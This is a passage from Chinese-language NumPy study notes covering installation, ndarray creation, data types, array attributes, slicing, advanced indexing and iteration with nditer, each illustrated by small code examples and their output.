- [Anaconda](https://www.anaconda.com/download/): 免费 Python 发行版，用于进行大规模数据处理、预测分析，和科学计算，致力于简化包的管理和部署。支持 Linux, Windows 和 Mac 系统。
- [Enthought Canopy](https://www.enthought.com/products/canopy): 提供了免费和商业发行版。持 Linux, Windows 和 Mac 系统。
- [Python(x,y)](https://python-xy.github.io/): 免费的 Python 发行版，包含了完整的 Python 语言开发包 及 [Spyder IDE](https://www.spyder-ide.org/)。支持 Windows，仅限 Python 2 版本。
- [WinPython](https://winpython.github.io/): 另一个免费的 Python 发行版，包含科学计算包与 Spyder IDE。支持 Windows。
- [Pyzo](http://www.pyzo.org/): 基于 Anaconda 的免费发行版本及 IEP 的交互开发环境，超轻量级。 支持 Linux, Windows 和 Mac 系统。

------

### 1-1-2 使用 pip 安装

安装 NumPy 最简单的方法就是使用 [pip 工具](https://www.runoob.com/w3cnote/python-pip-install-usage.html)：

```python
pip3 install --user numpy scipy matplotlib
```

--user 选项可以设置只安装在当前的用户下，而不是写入到系统目录。

默认情况使用国外线路，国外太慢，我们使用清华的镜像就可以:

```python
pip3 install numpy scipy matplotlib -i https://pypi.tuna.tsinghua.edu.cn/simple
```

------

### 1-1-3 Linux 下安装

#### 3-1 **Ubuntu & Debian**

```python
sudo apt-get install python3-numpy python3-scipy python3-matplotlib ipython ipython-notebook python-pandas python-sympy python-nose
```

#### 3-2 **CentOS/Fedora**

```python
sudo dnf install numpy scipy python-matplotlib ipython python-pandas sympy python-nose atlas-devel
```

### 1-1-4 **Mac 系统**

Mac 系统的 Homebrew 不包含 NumPy 或其他一些科学计算包，所以可以使用以下方式来安装：

```python
pip3 install numpy scipy matplotlib -i https://pypi.tuna.tsinghua.edu.cn/simple
```

------

### 1-1-5 安装验证

测试是否安装成功：

```python
>>> from numpy import *
>>> eye(4)
array([[1., 0., 0., 0.],
       [0., 1., 0., 0.],
       [0., 0., 1., 0.],
       [0., 0., 0., 1.]])
```

**from numpy import \*** 为导入 numpy 库。

**eye(4)** 生成对角矩阵。

## 1-2 NumPy Ndarray 对象

- NumPy 最重要的一个特点是其 N 维数组对象 ndarray，它是一系列同类型数据的集合，以 0 下标为开始进行集合中元素的索引。
- ndarray 对象是用于存放同类型元素的多维数组。
- ndarray 中的每个元素在内存中都有相同存储大小的区域。

ndarray 内部由以下内容组成：

- 一个指向数据（内存或内存映射文件中的一块数据）的指针。
- 数据类型或 dtype，描述在数组中的固定大小值的格子。
- 一个表示数组形状（shape）的元组，表示各维度大小的元组。
- 一个跨度元组（stride），其中的整数指的是为了前进到当前维度下一个元素需要"跨过"的字节数。

ndarray 的内部结构:

![image-20240420184452352](Python超详细的学习笔记（3.0）.assets/image-20240420184452352.png)

跨度可以是负数，这样会使数组在内存中后向移动，切片中 **obj[::-1]** 或 **obj[:,::-1]** 就是如此。

创建一个 ndarray 只需调用 NumPy 的 array 函数即可：

```
numpy.array(object, dtype = None, copy = True, order = None, subok = False, ndmin = 0)
```

**参数说明：**

![image-20240420184515188](Python超详细的学习笔记（3.0）.assets/image-20240420184515188.png)

### 1-2-1 实例 1

接下来可以通过以下实例帮助我们更好的理解。

```python
import numpy as np 
a = np.array([1,2,3])  
print (a)
```

输出结果如下：

```
[1 2 3]
```

### 1-2-2 实例 2

```python
# 多于一个维度  
import numpy as np 
a = np.array([[1,  2],  [3,  4]])  
print (a)
```

输出结果如下：

```
[[1  2] 
 [3  4]]
```

### 1-2-3 实例 3

```python
# 最小维度  
import numpy as np 
a = np.array([1, 2, 3, 4, 5], ndmin =  2)  
print (a)
```

输出如下：

```
[[1 2 3 4 5]]
```

### 1-2-4 实例 4

```python
# dtype 参数  
import numpy as np 
a = np.array([1,  2,  3], dtype = complex)  
print (a)
```

输出结果如下：

```
[1.+0.j 2.+0.j 3.+0.j]
```

ndarray 对象由计算机内存的连续一维部分组成，并结合索引模式，将每个元素映射到内存块中的一个位置。内存块以行顺序(C样式)或列顺序(FORTRAN或MatLab风格，即前述的F样式)来保存元素。

## 1-3 NumPy 数据类型

numpy 支持的数据类型比 Python 内置的类型要多很多，基本上可以和 C 语言的数据类型对应上，其中部分类型对应为 Python 内置的类型。下表列举了常用 NumPy 基本类型。

![image-20240420184845805](Python超详细的学习笔记（3.0）.assets/image-20240420184845805.png)

### 1-3-1 数据类型对象 (dtype)

数据类型对象（numpy.dtype 类的实例）用来描述与数组对应的内存区域是如何使用，它描述了数据的以下几个方面：：

- 数据的类型（整数，浮点数或者 Python 对象）
- 数据的大小（例如， 整数使用多少个字节存储）
- 数据的字节顺序（小端法或大端法）
- 在结构化类型的情况下，字段的名称、每个字段的数据类型和每个字段所取的内存块的部分
- 如果数据类型是子数组，那么它的形状和数据类型是什么。

字节顺序是通过对数据类型预先设定 **<** 或 **>** 来决定的。 **<** 意味着小端法(最小值存储在最小的地址，即低位组放在最前面)。**>** 意味着大端法(最重要的字节存储在最小的地址，即高位组放在最前面)。

dtype 对象是使用以下语法构造的：

```
numpy.dtype(object, align, copy)
```

- object - 要转换为的数据类型对象
- align - 如果为 true，填充字段使其类似 C 的结构体。
- copy - 复制 dtype 对象 ，如果为 false，则是对内置数据类型对象的引用

### 1-3-2 实例

接下来我们可以通过实例来理解。

#### 2-1 实例 1

```python
import numpy as np
# 使用标量类型
dt = np.dtype(np.int32)
print(dt)
```

输出结果为：

```
int32
```

#### 2-2 实例 2

```Python
import numpy as np
# int8, int16, int32, int64 四种数据类型可以使用字符串 'i1', 'i2','i4','i8' 代替
dt = np.dtype('i4')
print(dt)
```

输出结果为：

```
int32
```

#### 2-3 实例 3

```python
import numpy as np
# 字节顺序标注
dt = np.dtype('<i4')
print(dt)
```

输出结果为：

```
int32
```

下面实例展示结构化数据类型的使用，类型字段和对应的实际类型将被创建。

#### 2-4 实例 4

```python
# 首先创建结构化数据类型
import numpy as np
dt = np.dtype([('age',np.int8)]) 
print(dt)
```

输出结果为：

```
[('age', 'i1')]
```

#### 2-5 实例 5

```python
# 将数据类型应用于 ndarray 对象
import numpy as np
dt = np.dtype([('age',np.int8)]) 
a = np.array([(10,),(20,),(30,)], dtype = dt) 
print(a)
```

输出结果为：

```
[(10,) (20,) (30,)]
```

#### 2-6 实例 6

```python
# 类型字段名可以用于存取实际的 age 列
import numpy as np
dt = np.dtype([('age',np.int8)]) 
a = np.array([(10,),(20,),(30,)], dtype = dt) 
print(a['age'])
```

输出结果为：

```
[10 20 30]
```

下面的示例定义一个结构化数据类型 student，包含字符串字段 name，整数字段 age，及浮点字段 marks，并将这个 dtype 应用到 ndarray 对象。

#### 2-7 实例 7

```python
import numpy as np
student = np.dtype([('name','S20'), ('age', 'i1'), ('marks', 'f4')]) 
print(student)
```

输出结果为：

```
[('name', 'S20'), ('age', 'i1'), ('marks', 'f4')]
```

#### 2-8 实例 8

```python
import numpy as np
student = np.dtype([('name','S20'), ('age', 'i1'), ('marks', 'f4')]) 
a = np.array([('abc', 21, 50),('xyz', 18, 75)], dtype = student) 
print(a)
```

输出结果为：

```
[('abc', 21, 50.0), ('xyz', 18, 75.0)]
```

每个内建类型都有一个唯一定义它的字符代码，如下：

![image-20240420185238391](Python超详细的学习笔记（3.0）.assets/image-20240420185238391.png)

## 1-4 NumPy 数组属性

NumPy 的数组中比较重要 ndarray 对象属性有：

![image-20240420185443788](Python超详细的学习笔记（3.0）.assets/image-20240420185443788.png)

### 1-4-1 ndarray.ndim

ndarray.ndim 用于返回数组的维数，等于秩。

```Python
import numpy as np 
 
a = np.arange(24)  
print (a.ndim)             # a 现只有一个维度
# 现在调整其大小
b = a.reshape(2,4,3)  # b 现在拥有三个维度
print (b.ndim)
```

输出结果为：

```
1
3
```

### 1-4-2 ndarray.shape

ndarray.shape 表示数组的维度，返回一个元组，这个元组的长度就是维度的数目，即 ndim 属性(秩)。比如，一个二维数组，其维度表示"行数"和"列数"。

ndarray.shape 也可以用于调整数组大小。

```python
import numpy as np  
 
a = np.array([[1,2,3],[4,5,6]])  
print (a.shape)
```

输出结果为：

```
(2, 3)
```

调整数组大小。

```Python
import numpy as np 
 
a = np.array([[1,2,3],[4,5,6]]) 
a.shape =  (3,2)  
print (a)
```

输出结果为：

```
[[1 2]
 [3 4]
 [5 6]]
```

NumPy 也提供了 reshape 函数来调整数组大小。

```python
import numpy as np 
 
a = np.array([[1,2,3],[4,5,6]]) 
b = a.reshape(3,2)  
print (b)
```

输出结果为：

```
[[1 2]
 [3 4]
 [5 6]]
```

### 1-4-3 ndarray.itemsize

ndarray.itemsize 以字节的形式返回数组中每一个元素的大小。

例如，一个元素类型为 float64 的数组 itemsize 属性值为 8(float64 占用 64 个 bits，每个字节长度为 8，所以 64/8，占用 8 个字节），又如，一个元素类型为 complex32 的数组 item 属性为 4（32/8）。

```python
import numpy as np 
 
# 数组的 dtype 为 int8（一个字节）  
x = np.array([1,2,3,4,5], dtype = np.int8)  
print (x.itemsize)
 
# 数组的 dtype 现在为 float64（八个字节） 
y = np.array([1,2,3,4,5], dtype = np.float64)  
print (y.itemsize)
```

输出结果为：

```
1
8
```

### 1-4-4 ndarray.flags

ndarray.flags 返回 ndarray 对象的内存信息，包含以下属性：

![image-20240420185703893](Python超详细的学习笔记（3.0）.assets/image-20240420185703893.png)

```python
import numpy as np 
 
x = np.array([1,2,3,4,5])  
print (x.flags)
```

输出结果为：

```
  C_CONTIGUOUS : True
  F_CONTIGUOUS : True
  OWNDATA : True
  WRITEABLE : True
  ALIGNED : True
  WRITEBACKIFCOPY : False
  UPDATEIFCOPY : False
```

## 1-5 NumPy 创建数组

ndarray 数组除了可以使用底层 ndarray 构造器来创建外，也可以通过以下几种方式来创建。

### 5-1 numpy.empty

numpy.empty 方法用来创建一个指定形状（shape）、数据类型（dtype）且未初始化的数组：

```
numpy.empty(shape, dtype = float, order = 'C')
```

参数说明：

![image-20240420185808357](Python超详细的学习笔记（3.0）.assets/image-20240420185808357.png)

下面是一个创建空数组的实例：

```python
import numpy as np 
x = np.empty([3,2], dtype = int) 
print (x)
```

输出结果为：

```
[[ 6917529027641081856  5764616291768666155]
 [ 6917529027641081859 -5764598754299804209]
 [          4497473538      844429428932120]]
```

**注意** − 数组元素为随机值，因为它们未初始化。

### 5-2 numpy.zeros

创建指定大小的数组，数组元素以 0 来填充：

```
numpy.zeros(shape, dtype = float, order = 'C')
```

参数说明：

![image-20240420185916577](Python超详细的学习笔记（3.0）.assets/image-20240420185916577.png)

```python
import numpy as np
 
# 默认为浮点数
x = np.zeros(5) 
print(x)
 
# 设置类型为整数
y = np.zeros((5,), dtype = int) 
print(y)
 
# 自定义类型
z = np.zeros((2,2), dtype = [('x', 'i4'), ('y', 'i4')])  
print(z)
```

输出结果为：

```
[0. 0. 0. 0. 0.]
[0 0 0 0 0]
[[(0, 0) (0, 0)]
 [(0, 0) (0, 0)]]
```

### 5-3 numpy.ones

创建指定形状的数组，数组元素以 1 来填充：

```
numpy.ones(shape, dtype = None, order = 'C')
```

参数说明：

![image-20240420185946929](Python超详细的学习笔记（3.0）.assets/image-20240420185946929.png)

```python
import numpy as np
 
# 默认为浮点数
x = np.ones(5) 
print(x)
 
# 自定义类型
x = np.ones([2,2], dtype = int)
print(x)
```

输出结果为：

```
[1. 1. 1. 1. 1.]
[[1 1]
 [1 1]]
```

### 5-4 numpy.zeros_like

numpy.zeros_like 用于创建一个与给定数组具有相同形状的数组，数组元素以 0 来填充。

numpy.zeros 和 numpy.zeros_like 都是用于创建一个指定形状的数组，其中所有元素都是 0。

它们之间的区别在于：numpy.zeros 可以直接指定要创建的数组的形状，而 numpy.zeros_like 则是创建一个与给定数组具有相同形状的数组。

```
numpy.zeros_like(a, dtype=None, order='K', subok=True, shape=None)
```

参数说明：

![image-20240420190036112](Python超详细的学习笔记（3.0）.assets/image-20240420190036112.png)

创建一个与 arr 形状相同的，所有元素都为 0 的数组：

```Python
import numpy as np
 
# 创建一个 3x3 的二维数组
arr = np.array([[1, 2, 3], [4, 5, 6], [7, 8, 9]])
 
# 创建一个与 arr 形状相同的，所有元素都为 0 的数组
zeros_arr = np.zeros_like(arr)
print(zeros_arr)
```

输出结果为：

```
[[0 0 0]
 [0 0 0]
 [0 0 0]]
```

### 5-5 numpy.ones_like

numpy.ones_like 用于创建一个与给定数组具有相同形状的数组，数组元素以 1 来填充。

numpy.ones 和 numpy.ones_like 都是用于创建一个指定形状的数组，其中所有元素都是 1。

它们之间的区别在于：numpy.ones 可以直接指定要创建的数组的形状，而 numpy.ones_like 则是创建一个与给定数组具有相同形状的数组。

```
numpy.ones_like(a, dtype=None, order='K', subok=True, shape=None)
```

参数说明：

![image-20240420190119049](Python超详细的学习笔记（3.0）.assets/image-20240420190119049.png)

```Python
import numpy as np
 
# 创建一个 3x3 的二维数组
arr = np.array([[1, 2, 3], [4, 5, 6], [7, 8, 9]])
 
# 创建一个与 arr 形状相同的，所有元素都为 1 的数组
ones_arr = np.ones_like(arr)
print(ones_arr)
```

输出结果为：

```
[[1 1 1]
 [1 1 1]
 [1 1 1]]
```

## 1-6 NumPy 从已有的数组创建数组

本章节我们将学习如何从已有的数组创建数组。

### 1-6-1 numpy.asarray

numpy.asarray 类似 numpy.array，但 numpy.asarray 参数只有三个，比 numpy.array 少两个。

```
numpy.asarray(a, dtype = None, order = None)
```

参数说明：

![image-20240420190221820](Python超详细的学习笔记（3.0）.assets/image-20240420190221820.png)

将列表转换为 ndarray:

```python
import numpy as np 
 
x =  [1,2,3] 
a = np.asarray(x)  
print (a)
```

输出结果为：

```
[1  2  3]
```

将元组转换为 ndarray:

```python
import numpy as np 
 
x =  (1,2,3) 
a = np.asarray(x)  
print (a)
```

输出结果为：

```
[1  2  3]
```

将元组列表转换为 ndarray:

```python
import numpy as np 
 
x =  [(1,2,3),(4,5)] 
a = np.asarray(x)  
print (a)
```

输出结果为：

```
[(1, 2, 3) (4, 5)]
```

设置了 dtype 参数：

```python
import numpy as np 
 
x =  [1,2,3] 
a = np.asarray(x, dtype =  float)  
print (a)
```

输出结果为：

```
[ 1.  2.  3.]
```

### 1-6-2 numpy.frombuffer

numpy.frombuffer 用于实现动态数组。

numpy.frombuffer 接受 buffer 输入参数，以流的形式读入转化成 ndarray 对象。

```
numpy.frombuffer(buffer, dtype = float, count = -1, offset = 0)
```

> **注意：**buffer 是字符串的时候，Python3 默认 str 是 Unicode 类型，所以要转成 bytestring 在原 str 前加上 b。

参数说明：

![image-20240420190356101](Python超详细的学习笔记（3.0）.assets/image-20240420190356101.png)

#### 2-1 Python3.x 实例

```python
import numpy as np 
 
s =  b'Hello World' 
a = np.frombuffer(s, dtype =  'S1')  
print (a)
```

输出结果为：

```
[b'H' b'e' b'l' b'l' b'o' b' ' b'W' b'o' b'r' b'l' b'd']
```

#### 2-2 Python2.x 实例

```python
import numpy as np
s =  'Hello World'
a = np.frombuffer(s, dtype =  'S1')
print (a)
```

输出结果为：

```
['H' 'e' 'l' 'l' 'o' ' ' 'W' 'o' 'r' 'l' 'd']
```

### 1-6-3 numpy.fromiter

numpy.fromiter 方法从可迭代对象中建立 ndarray 对象，返回一维数组。

```
numpy.fromiter(iterable, dtype, count=-1)
```

![image-20240420190511643](Python超详细的学习笔记（3.0）.assets/image-20240420190511643.png)

```python
import numpy as np 
 
# 使用 range 函数创建列表对象  
list=range(5)
it=iter(list)
 
# 使用迭代器创建 ndarray 
x=np.fromiter(it, dtype=float)
print(x)
```

输出结果为：

```
[0. 1. 2. 3. 4.]
```

## 1-7 NumPy 从数值范围创建数组

这一章节我们将学习如何从数值范围创建数组。

### 1-7-1 numpy.arange

numpy 包中的使用 arange 函数创建数值范围并返回 ndarray 对象，函数格式如下：

```
numpy.arange(start, stop, step, dtype)
```

根据 start 与 stop 指定的范围以及 step 设定的步长，生成一个 ndarray。

参数说明：

![image-20240420190631701](Python超详细的学习笔记（3.0）.assets/image-20240420190631701.png)

**实例**

生成 0 到 4 长度为 5 的数组:

```python
import numpy as np
 
x = np.arange(5)  
print (x)
```

输出结果如下：

```
[0  1  2  3  4]
```

设置返回类型位 float:

```python
import numpy as np
 
# 设置了 dtype
x = np.arange(5, dtype =  float)  
print (x)
```

输出结果如下：

```
[0.  1.  2.  3.  4.]
```

设置了起始值、终止值及步长：

```python
import numpy as np
x = np.arange(10,20,2)  
print (x)
```

输出结果如下：

```
[10  12  14  16  18]
```

### 1-7-2 numpy.linspace

numpy.linspace 函数用于创建一个一维数组，数组是一个等差数列构成的，格式如下：

```python
np.linspace(start, stop, num=50, endpoint=True, retstep=False, dtype=None)
```

参数说明：

![image-20240420190831346](Python超详细的学习笔记（3.0）.assets/image-20240420190831346.png)

以下实例用到三个参数，设置起始点为 1 ，终止点为 10，数列个数为 10。

```python
import numpy as np
a = np.linspace(1,10,10)
print(a)
```

输出结果为：

```
[ 1.  2.  3.  4.  5.  6.  7.  8.  9. 10.]
```

设置元素全部是1的等差数列：

```python
import numpy as np
a = np.linspace(1,1,10)
print(a)
```

输出结果为：

```
[1. 1. 1. 1. 1. 1. 1. 1. 1. 1.]
```

将 endpoint 设为 false，不包含终止值：

```python
import numpy as np
 
a = np.linspace(10, 20,  5, endpoint =  False)  
print(a)
```

输出结果为：

```
[10. 12. 14. 16. 18.]
```

如果将 endpoint 设为 true，则会包含 20。

以下实例设置间距。

```python
import numpy as np
a =np.linspace(1,10,10,retstep= True)
 
print(a)
# 拓展例子
b =np.linspace(1,10,10).reshape([10,1])
print(b)
```

输出结果为：

```
(array([ 1.,  2.,  3.,  4.,  5.,  6.,  7.,  8.,  9., 10.]), 1.0)
[[ 1.]
 [ 2.]
 [ 3.]
 [ 4.]
 [ 5.]
 [ 6.]
 [ 7.]
 [ 8.]
 [ 9.]
 [10.]]
```

### 1-7-3 numpy.logspace

numpy.logspace 函数用于创建一个于等比数列。格式如下：

```
np.logspace(start, stop, num=50, endpoint=True, base=10.0, dtype=None)
```

base 参数意思是取对数的时候 log 的下标。

![image-20240420191038591](Python超详细的学习笔记（3.0）.assets/image-20240420191038591.png)

```python
import numpy as np
# 默认底数是 10
a = np.logspace(1.0,  2.0, num =  10)  
print (a)
```

输出结果为：

```
[ 10.           12.91549665     16.68100537      21.5443469  27.82559402      
  35.93813664   46.41588834     59.94842503      77.42636827    100.    ]
```

将对数的底数设置为 2 :

```python
import numpy as np
a = np.logspace(0,9,10,base=2)
print (a)
```

输出如下：

```
[  1.   2.   4.   8.  16.  32.  64. 128. 256. 512.]
```

## 1-8 NumPy 切片和索引

ndarray对象的内容可以通过索引或切片来访问和修改，与 Python 中 list 的切片操作一样。

ndarray 数组可以基于 0 - n 的下标进行索引，切片对象可以通过内置的 slice 函数，并设置 start, stop 及 step 参数进行，从原数组中切割出一个新数组。

```python
import numpy as np
 
a = np.arange(10)
s = slice(2,7,2)   # 从索引 2 开始到索引 7 停止，间隔为2
print (a[s])
```

输出结果为：

```
[2  4  6]
```

以上实例中，我们首先通过 arange() 函数创建 ndarray 对象。 然后，分别设置起始，终止和步长的参数为 2，7 和 2。

我们也可以通过冒号分隔切片参数 **start:stop:step** 来进行切片操作：

```python
import numpy as np
 
a = np.arange(10)  
b = a[2:7:2]   # 从索引 2 开始到索引 7 停止，间隔为 2
print(b)
```

输出结果为：

```
[2  4  6]
```

冒号 **:** 的解释：如果只放置一个参数，如 **[2]**，将返回与该索引相对应的单个元素。如果为 **[2:]**，表示从该索引开始以后的所有项都将被提取。如果使用了两个参数，如 **[2:7]**，那么则提取两个索引(不包括停止索引)之间的项。

```python
import numpy as np
 
a = np.arange(10)  # [0 1 2 3 4 5 6 7 8 9]
b = a[5] 
print(b)
```

输出结果为：

```
5
```

```python
import numpy as np
 
a = np.arange(10)
print(a[2:])
```

输出结果为：

```
[2  3  4  5  6  7  8  9]
```

```python
import numpy as np
 
a = np.arange(10)  # [0 1 2 3 4 5 6 7 8 9]
print(a[2:5])
```

输出结果为：

```
[2  3  4]
```

多维数组同样适用上述索引提取方法：

```python
import numpy as np
 
a = np.array([[1,2,3],[3,4,5],[4,5,6]])
print(a)
# 从某个索引处开始切割
print('从数组索引 a[1:] 处开始切割')
print(a[1:])
```

输出结果为：

```Python
[[1 2 3]
 [3 4 5]
 [4 5 6]]
从数组索引 a[1:] 处开始切割
[[3 4 5]
 [4 5 6]]
```

切片还可以包括省略号 **…**，来使选择元组的长度与数组的维度相同。 如果在行位置使用省略号，它将返回包含行中元素的 ndarray。

```Python
import numpy as np
 
a = np.array([[1,2,3],[3,4,5],[4,5,6]])  
print (a[...,1])   # 第2列元素
print (a[1,...])   # 第2行元素Python
print (a[...,1:])  # 第2列及剩下的所有元素
```

输出结果为：

```python
[2 4 5]
[3 4 5]
[[2 3]
 [4 5]
 [5 6]]
```

## 1-9 NumPy 高级索引

### 1-9-1 整数数组索引

整数数组索引是指使用一个数组来访问另一个数组的元素。这个数组中的每个元素都是目标数组中某个维度上的索引值。

以下实例获取数组中 **(0,0)，(1,1)** 和 **(2,0)** 位置处的元素。

```python
import numpy as np 
 
x = np.array([[1,  2],  [3,  4],  [5,  6]]) 
y = x[[0,1,2],  [0,1,0]]  
print (y)
```

输出结果为：

```
[1  4  5]
```

以下实例获取了 4X3 数组中的四个角的元素。 行索引是 [0,0] 和 [3,3]，而列索引是 [0,2] 和 [0,2]。

```python
import numpy as np 
 
x = np.array([[  0,  1,  2],[  3,  4,  5],[  6,  7,  8],[  9,  10,  11]])  
print ('我们的数组是：' )
print (x)
print ('\n')
rows = np.array([[0,0],[3,3]]) 
cols = np.array([[0,2],[0,2]]) 
y = x[rows,cols]  
print  ('这个数组的四个角元素是：')
print (y)
```

输出结果为：

```
我们的数组是：
[[ 0  1  2]
 [ 3  4  5]
 [ 6  7  8]
 [ 9 10 11]]


这个数组的四个角元素是：
[[ 0  2]
 [ 9 11]]
```

返回的结果是包含每个角元素的 ndarray 对象。

可以借助切片 **:** 或 **…** 与索引数组组合。如下面例子：

```Python
import numpy as np
 
a = np.array([[1,2,3], [4,5,6],[7,8,9]])
b = a[1:3, 1:3]
c = a[1:3,[1,2]]
d = a[...,1:]
print(b)
print(c)
print(d)
```

输出结果为：

```
[[5 6]
 [8 9]]
[[5 6]
 [8 9]]
[[2 3]
 [5 6]
 [8 9]]
```

### 1-9-2 布尔索引

我们可以通过一个布尔数组来索引目标数组。

布尔索引通过布尔运算（如：比较运算符）来获取符合指定条件的元素的数组。

以下实例获取大于 5 的元素：

```Python
import numpy as np 
 
x = np.array([[  0,  1,  2],[  3,  4,  5],[  6,  7,  8],[  9,  10,  11]])  
print ('我们的数组是：')
print (x)
print ('\n')
# 现在我们会打印出大于 5 的元素  
print  ('大于 5 的元素是：')
print (x[x >  5])
```

输出结果为：

```
我们的数组是：
[[ 0  1  2]
 [ 3  4  5]
 [ 6  7  8]
 [ 9 10 11]]


大于 5 的元素是：
[ 6  7  8  9 10 11]
```

以下实例使用了 **~**（取补运算符）来过滤 NaN。

```python
import numpy as np 
 
a = np.array([np.nan,  1,2,np.nan,3,4,5])  
print (a[~np.isnan(a)])
```

输出结果为：

```
[ 1.   2.   3.   4.   5.]
```

以下实例演示如何从数组中过滤掉非复数元素。

```python
import numpy as np 
 
a = np.array([1,  2+6j,  5,  3.5+5j])  
print (a[np.iscomplex(a)])
```

输出如下：

```
[2.0+6.j  3.5+5.j]
```

### 1-9-3 花式索引

花式索引指的是利用整数数组进行索引。

**花式索引根据索引数组的值作为目标数组的某个轴的下标来取值。**

对于使用一维整型数组作为索引，如果目标是一维数组，那么索引的结果就是对应位置的元素，如果目标是二维数组，那么就是对应下标的行。

花式索引跟切片不一样，它总是将数据复制到新数组中。

### 1-9-4 一维数组

一维数组只有一个轴 **axis = 0**，所以一维数组就在 **axis = 0** 这个轴上取值：

```python
import numpy as np

x = np.arange(9)
print(x)
# 一维数组读取指定下标对应的元素
print("-------读取下标对应的元素-------")
x2 = x[[0, 6]] # 使用花式索引
print(x2) 

print(x2[0])
print(x2[1])
```

输出结果为：

```
[0 1 2 3 4 5 6 7 8]
-------读取下标对应的元素-------
[0 6]
0
6
```

### 1-9-5 二维数组

1、传入顺序索引数组

```python
import numpy as np 
 
x=np.arange(32).reshape((8,4))
print(x)
# 二维数组读取指定下标对应的行
print("-------读取下标对应的行-------")
print (x[[4,2,1,7]])
```

**print (x[[4,2,1,7]])** 输出下表为 **4, 2, 1, 7** 对应的行，输出结果为：

```
[[ 0  1  2  3]
 [ 4  5  6  7]
 [ 8  9 10 11]
 [12 13 14 15]
 [16 17 18 19]
 [20 21 22 23]
 [24 25 26 27]
 [28 29 30 31]]
-------读取下标对应的行-------
[[16 17 18 19]
 [ 8  9 10 11]
 [ 4  5  6  7]
 [28 29 30 31]]
```

2、传入倒序索引数组

```python
import numpy as np 
 
x=np.arange(32).reshape((8,4))
print (x[[-4,-2,-1,-7]])
```

输出结果为：

```
[[16 17 18 19]
 [24 25 26 27]
 [28 29 30 31]
 [ 4  5  6  7]]
```

3、传入多个索引数组（要使用 np.ix_）

np.ix_ 函数就是输入两个数组，产生笛卡尔积的映射关系。

笛卡尔乘积是指在数学中，两个集合 X 和 Y 的笛卡尔积（Cartesian product），又称直积，表示为 **X×Y**，第一个对象是X的成员而第二个对象是 Y 的所有可能有序对的其中一个成员。

例如 **A={a,b}, B={0,1,2}**，则：

```
A×B={(a, 0), (a, 1), (a, 2), (b, 0), (b, 1), (b, 2)}
B×A={(0, a), (0, b), (1, a), (1, b), (2, a), (2, b)}
```

```python
import numpy as np 
 
x=np.arange(32).reshape((8,4))
print (x[np.ix_([1,5,7,2],[0,3,1,2])])
```

输出结果为：

```
[[ 4  7  5  6]
 [20 23 21 22]
 [28 31 29 30]
 [ 8 11  9 10]]
```

## 1-10 NumPy 迭代数组

NumPy 迭代器对象 numpy.nditer 提供了一种灵活访问一个或者多个数组元素的方式。

迭代器最基本的任务的可以完成对数组元素的访问。

接下来我们使用 arange() 函数创建一个 2X3 数组，并使用 nditer 对它进行迭代。

```python
import numpy as np
 
a = np.arange(6).reshape(2,3)
print ('原始数组是：')
print (a)
print ('\n')
print ('迭代输出元素：')
for x in np.nditer(a):
    print (x, end=", " )
print ('\n')
```

输出结果为：

```
原始数组是：
[[0 1 2]
 [3 4 5]]


迭代输出元素：
0, 1, 2, 3, 4, 5, 
```

以上实例不是使用标准 C 或者 Fortran 顺序，选择的顺序是和数组内存布局一致的，这样做是为了提升访问的效率，默认是行序优先（row-major order，或者说是 C-order）。

这反映了默认情况下只需访问每个元素，而无需考虑其特定顺序。我们可以通过迭代上述数组的转置来看到这一点，并与以 C 顺序访问数组转置的 copy 方式做对比，如下实例：

```python
import numpy as np
 
a = np.arange(6).reshape(2,3)
for x in np.nditer(a.T):
    print (x, end=", " )
print ('\n')
 
for x in np.nditer(a.T.copy(order='C')):
    print (x, end=", " )
print ('\n')
```

输出结果为：

```
0, 1, 2, 3, 4, 5, 

0, 3, 1, 4, 2, 5, 
```

从上述例子可以看出，a 和 a.T 的遍历顺序是一样的，也就是他们在内存中的存储顺序也是一样的，但是 **a.T.copy(order = 'C')** 的遍历结果是不同的，那是因为它和前两种的存储方式是不一样的，默认是按行访问。

### 1-10-1 控制遍历顺序

- `for x in np.nditer(a, order='F'):`Fortran order，即是列序优先；
- `for x in np.nditer(a.T, order='C'):`C order，即是行序优先；

```python
import numpy as np
 
a = np.arange(0,60,5) 
a = a.reshape(3,4)  
print ('原始数组是：') 
print (a) 
print ('\n') 
print ('原始数组的转置是：') 
b = a.T 
print (b) 
print ('\n') 
print ('以 C 风格顺序排序：') 
c = b.copy(order='C')  
print (c)
for x in np.nditer(c):  
    print (x, end=", " )
print  ('\n') 
print  ('以 F 风格顺序排序：')
c = b.copy(order='F')  
print (c)
for x in np.nditer(c):  
    print (x, end=", " )
```

输出结果为：

```
原始数组是：
[[ 0  5 10 15]
 [20 25 30 35]
 [40 45 50 55]]


原始数组的转置是：
[[ 0 20 40]
 [ 5 25 45]
 [10 30 50]
 [15 35 55]]


以 C 风格顺序排序：
[[ 0 20 40]
 [ 5 25 45]
 [10 30 50]
 [15 35 55]]
0, 20, 40, 5, 25, 45, 10, 30, 50, 15, 35, 55, 

以 F 风格顺序排序：
[[ 0 20 40]
 [ 5 25 45]
 [10 30 50]
 [15 35 55]]
0, 5, 10, 15, 20, 25, 30, 35, 40, 45, 50, 55,
```

可以通过显式设置，来强制 nditer 对象使用某种顺序：

```python
import numpy as np 
 
a = np.arange(0,60,5) 
a = a.reshape(3,4)  
print ('原始数组是：')
print (a)
print ('\n')
print ('以 C 风格顺序排序：')
for x in np.nditer(a, order =  'C'):  
    print (x, end=", " )
print ('\n')
print ('以 F 风格顺序排序：')
for x in np.nditer(a, order =  'F'):  
    print (x, end=", " )
```

输出结果为：

```
原始数组是：
[[ 0  5 10 15]
 [20 25 30 35]
 [40 45 50 55]]


以 C 风格顺序排序：
0, 5, 10, 15, 20, 25, 30, 35, 40, 45, 50, 55, 

以 F 风格顺序排序：
0, 20, 40, 5, 25, 45, 10, 30, 50, 15, 35, 55,
```

### 1-10-2 修改数组中元素的值

nditer 对象有另一个可选参数 op_flags。 默认情况下，nditer 将视待迭代遍历的数组为只读对象（read-only），为了在遍历数组的同时，实现对数组元素值的修改，必须指定 readwrite 或者 writeonly 的模式。

```python
import numpy as np
 
a = np.arange(0,60,5) 
a = a.reshape(3,4)  
print ('原始数组是：')
print (a)
print ('\n')
for x in np.nditer(a, op_flags=['readwrite']): 
    x[...]=2*x 
print ('修改后的数组是：')
print (a)
```

输出结果为：

```
原始数组是：
[[ 0  5 10 15]
 [20 25 30 35]
 [40 45 50 55]]


修改后的数组是：
[[  0  10  20  30]
 [ 40  50  60  70]
 [ 80  90 100 110]]
```

### 1-10-3 使用外部循环

nditer 类的构造器拥有 flags 参数，它可以接受下列值：

